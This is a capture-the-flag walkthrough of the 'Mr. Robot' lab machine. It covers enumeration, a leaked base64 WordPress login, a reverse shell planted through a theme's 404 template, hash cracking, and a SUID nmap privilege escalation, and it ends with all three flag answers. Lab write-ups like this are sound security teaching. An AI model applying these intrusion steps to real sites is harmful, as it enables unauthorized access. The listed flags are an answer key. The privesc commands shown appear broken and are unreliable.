# Mr. Robot
## Author: W.

``` bash
export IP=10.48.170.13
```

# Machine enumeration
## Port discovery
```bash
nmap -sC -sV -v -oN nmap.log 10.48.170.13
```

Ports 22, 80, and 443 are open, cool

I've tried to visit both 80 and 443, and they display the same content.

## Directory brute force time
```bash
ffuf -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.48.170.13/FUZZ
```
Based on what i have see, it is a wordpress website  
But more importantly, head over to /robots, we find a file call key-1-of-3.txt, and there we go, we get the first key.

## More FIlE time
When visiting those directory, we visited /atom and a *3-kj9j6e.atom* is downloaded, which is a xml document  
We also see a /feed/atom, which when visited, downloaded another atom file, but it is the same...

## wpscan
Given that it is a wp site, lets use wpscan for potential vuln
```bash
wpscan --url 10.48.170.13 --api-token <TOKEN>
```
not much things i guess

## Directories, again
Head back to ffuf and visit more files, we meet /license, and saw this:
```
ZWxsaW90OkVSMjgtMDY1Mgo=
```
Looks like base64, and it really is
```bash
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d 
```
And we get:
```
elliot:ER28-0652
```
Probably a wp-admin/ssh credential  
> It is a wp cred cuz I tried it on /login

## wp time
we saw we are a admin user in /admin/users.php, and we can upload files in *media*, so lets upload our php-revshell (credit: pentest monkey)  
Sadly, .php is not allowed, so I modified the 404 in template instead 

## return to robots
Head over to another file find in robots: /fsocity.dic, we see a long wordlist.
> So long man
I've tried to randomly test whether some of them are required flag2, but probably not

## revshell
after gaining access to machine and upgraded my shell, we head over to /home and finf /robots, key-2-of-3.txt and a md5 hash
No permission to read key, but we can read the hash, which is probably robot's passwd

I think we are supppose to use the .dic found in robots, but i think crackstation would be faster, so...
```
abcdefghijklmnopqrstuvwxyz
```

## ssh-time
```bash
ssh robot@10.48.170.13
bash
```
and we get the second key~

## priv esc
i tried to run ```sudo -l``` but mr.robot cant run sudo
so I run linpeas on it and i see nmap appear in the machine
> it has suid bit on too

head to gtfobins and we see
> https://gtfobins.github.io/gtfobins/nmap/

```bash
LFILE=/tmp/bash
nmap -oG=$LFILE DATA
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Boom! we are now root

# Solutions

### key 1: 
```
073403c8a58a1f80d943455fb30724b9
```

### key 2:
```
822c73956184f694993bede3eb39f959
```

### key 3
```
04787ddef27c3dee1ee161b21670b4e4
```

-----

> Editor notes: I hate writing write up and notes, but yeah